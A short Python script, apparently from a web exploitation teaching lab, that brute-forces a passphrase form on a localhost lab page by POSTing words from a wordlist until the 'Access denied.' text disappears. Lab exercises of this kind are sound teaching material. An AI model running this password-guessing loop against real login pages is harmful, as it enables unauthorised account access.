# Web exploitation tutorial
# Author: Dr. Jean Gourd
# Shows how to solve a web exploitation lab example.

from sys import stdin
import requests

URL = "http://localhost/3/tutorial1-result.php"
FIND_TEXT = "Access denied."

for word in stdin:
    print(f"Trying {word.rstrip()}...", end="")

    passphrase = [ ("passphrase", word.rstrip()) ]
    response = requests.post(URL, data=passphrase, verify=False)

    if (response.text.find(FIND_TEXT) == -1):
        print("FOUND!")
        exit(0)
    else:
        print()
